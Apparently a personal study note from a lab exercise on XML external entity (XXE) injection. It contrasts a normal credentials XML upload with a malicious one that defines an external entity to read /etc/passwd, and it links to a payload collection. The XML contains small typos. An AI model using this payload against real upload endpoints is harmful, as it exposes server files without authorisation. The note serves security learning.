XML contians some pontentially dangerous features that can be used to perform an attack.

# XXe 0x01
In this case we have an application that allows us to upload a XML file:
- ![[Pasted image 20250107160729.png]]

So we want to create a malicious XML file to execute commands.

Our legitimate file must be on the form:
```XML
<?xml version="1.0" encoding="UTF-8"?>

<creds>
	<user>username</user>
	<password>pass</password>
</creds
```


So we can create a mlicious file:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
	<!ELEMENT creds ANY >
	<!ENTITY xxe system "file:///etc/passwd">
]>


<creds>
	<user>&xxe;</user>
	<password>pass</password>
</creds
```


The idea is to declarate the external entity that reads the file `/etc/passwd` and then trigger it with `&xxe;`

To find more XXE payloads we can visit [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)


Uploading the malicious file we obtain:
- ![[Pasted image 20250107161425.png]]

It is very rare to find it, in general we can have this vulnerability in APIs when it requires a JSON but XML is also accepted.

